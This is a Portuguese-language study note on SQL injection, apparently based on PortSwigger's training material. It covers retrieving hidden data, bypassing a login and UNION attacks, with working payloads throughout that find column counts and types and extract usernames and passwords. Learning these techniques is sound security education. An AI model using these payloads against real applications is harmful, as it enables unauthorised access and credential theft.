# SQL Injection

## SQL Injection

### Retrieving hidden data

Exemplo:

```sql
SELECT * FROM products WHERE category = 'category' AND released = 1 
```

A restrição para acessar ou não um item é restrito pelo parâmetro `released`

Um exemplo para poder acessar dados que um usuário comum não poderia:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Um exemplo para poder acessar o dados de todas as tablas:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 
```

### Subverting application logic

Um exemplo de um login em uma query onde a entrada não é processado antes de fazer sua busca:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

É possível comentar a comparação da senha, assim é possível entrar em qualquer usuário.


```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'bluecheese'
```

### Retrieving data from other databases tables

Em casos onde a chamada do SQL retorna respostas com a aplicação, é possível acessar dados de outras tabelas usando a palavra chave `UNION` executando um `SELECT` adicional.

Um exemplo onde a entrada não é tratada:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

É possível rodar o comando para receber os usuários e a senha de na tabela de usuários:

```sql
' UNION SELECT username, password FROM users--
```

#### UNION Attacks

Para esse ataque funcionar é necessário essas duas condições:

* As buscas individuais precisam retornar o mesmo número de colunas
* o tipo de data de cada coluna precisa ser compatível entre as buscas individuais

Normalmente para a execução desse ataque é descobrir a resposta para essas perguntas:

* Quantas colunas são retornadas pela busca original?
* Quais são os tipos de dadaos para cada query original?

##### Quantas colunas são retornadas pela busca original?

###### Método 1

Esse método usa várias buscas `ORDER BY N --` incrementando o número `N`, quando o número exceder o número de colunas o banco de dados vai retornar um erro:

Exemplo de erro:

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

###### Método 2

Esse método usa várias buscas `'UNION SELECT NULL, NULL,...--` e enquanto número de queries não for o mesmo do banco de dados um erro será retornado.

Exemplo de erro:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

* `Oracle`: cada `SELECT` precisa de um `FROM` para especificar uma tabela válida. Existe uma tabela built-in chamada `dual` que poder ser usada. Um exemplo de como eles seriam executados: `' UNION SELECT NULL FROM DUAL --`

* `MySQL`: os payloads no `MySQL` precisam ser seguidos por um espaço, ou também é possível usar o caractere `#` para identificar um comentário.

##### Quais são os tipos de dados para cada query original?

Sabendo qual é o tamanho da busca é possível tentar descobrir qual das buscas suporta o tipo de dado `string`

Exemplo de teste:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Caso o tipo de data não seja compatível vai causar um erro no banco de dados, por exemplo:

```sql
Conversion failed when converting the varchar value 'a' to data type int.
```

##### Usando o ataque UNION para acessar dados sensíveis

Supondo que a busca retorne duas colunas que conseguem guardar dados de `string`, no exemplo abaixo tentamos pegar os campos `username` e `password` da tabela `users`:

```sql
' UNION SELECT username, password FROM users-- 
```

Obs: Precisamos descobrir o nome da tabela e de seus campos

##### Retornando múltiplos valors de uma única coluna

Supondo que a coluna retorne apenas uma coluna é possível retornar múltiplos valores juntos, idealmente incluíndo um separador para que seja possível distinguir as informações.

Na `Oracle` por exemplo você pode usar o payload (os operadores `||` são concatenações, e as duas buscas vão vir separadas pelo caractere `~`):

```sql
' UNION SELECT username || '~' || password FROM users--
```

Os resultados vão permitir que você consiga ler todos os nomes e senhas, por exemplo:

```
administrator~s3cure
wiener~peter
carlos~montoya
```

Para outros bancos de dados temos o [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)